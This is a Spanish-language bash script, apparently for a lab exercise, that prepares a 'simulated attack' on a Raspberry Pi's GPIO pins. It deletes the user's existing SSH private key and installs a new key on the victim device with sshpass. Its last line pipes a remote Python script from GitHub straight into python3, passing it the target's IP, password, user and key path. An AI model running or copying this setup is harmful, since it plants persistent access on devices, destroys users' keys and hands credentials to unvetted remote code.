#!/bin/bash

# Este script es la configuración previa antes de realizar el ataque simulado de modificar el GPIO de la Raspberry Pi

# Ejecución del Script

  # curl -sL | bash -s

# Definir constantes de color
  cColorAzul='\033[0;34m'
  cColorAzulClaro='\033[1;34m'
  cColorVerde='\033[1;32m'
  cColorRojo='\033[1;31m'
  # Para el color rojo también:
    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
  cFinColor='\033[0m'

echo ""
echo -e "${cColorAzulClaro}  Iniciando el script de modificación del GPIO de la Raspberry (x)...${cFinColor}"
echo ""

if [ $# -ne 4 ]; then
  echo "Uso: $0  -s <IP> <Passphrase> <Usuario> <Pin Gpio>"
  exit 1
fi

# Parámetros
vIpRaspberry=$1
vPassp=$2
vUser=$3
vGpio=$4
# Generación de claves ssh
echo ""
echo " Generando las claves ssh para conectarse a la Raspberry.... "
echo ""

# Archivo de las claves
vKey_Name="${HOME}/.ssh/id_rsa"

# Verificar si ya existe una clave, si es así, eliminarla
if [ -f "$vKey_Name" ]; then
  rm -f "$vKey_Name"
  echo "Clave SSH existente eliminada."
fi

# Generación de la clave SSH
ssh-keygen -t rsa -b 4096 -f "$vKey_Name" -C "$vUser@$vIpRaspberry" -N "$vPassp"

if [ $? -eq 0 ]; then
  echo "Clave SSH generada exitosamente en $vKey_Name."
else
  echo "Hubo un error al generar la clave SSH."
  exit 1
fi

echo ""
echo " Enviando las claves SSH a la máquina victima.... "
echo ""

# Instalación de sshpass
sudo apt install sshpass -y

# Cambiar permisos de la clave pública
sudo chmod 644 "${HOME}/.ssh/id_rsa.pub"

# Enviar la clave SSH utilizando sshpass
sudo sshpass -p "$vPassp" ssh-copy-id "$vUser@$vIpRaspberry"

if [ $? -eq 0 ]; then
  echo "Claves enviadas correctamente."
else
  echo "Hubo un error al enviar la clave SSH."
  exit 1
fi

echo ""
echo " Instalando los últimos paquetes necesarios..."
echo ""

# Paquete necesario para la conexión ssh mediante python
cd ~
git clone https://github.com/WiringPi/WiringPi.git
cd WiringPi
./build

if [ $? -eq 0 ]; then
  echo "Paquete WiringPi instalado correctamente."
else
  echo "Hubo un error al instalar el paquete WiringPi."
  exit 1
fi

echo ""
echo " Versión de GPIO"
echo ""

# Verificar la versión de GPIO
gpio -v

echo ""
echo " Instalando Paramiko.... "
echo ""

# Instalar Paramiko
sudo apt install python3-paramiko -y

if [ $? -eq 0 ]; then
  echo "Paquete Paramiko instalado correctamente."
else
  echo "Hubo un error al instalar el paquete Paramiko."
  exit 1
fi

# Ejecutar el script Python para modificar el GPIO
curl -sL https://raw.githubusercontent.com/L1LBRO/Modificar-GPIO-Raspberry-Pi/refs/heads/main/Gpio_Mod.py | python3 - $vIpRaspberry $vPassp $vUser $vGpio $vKey_Name
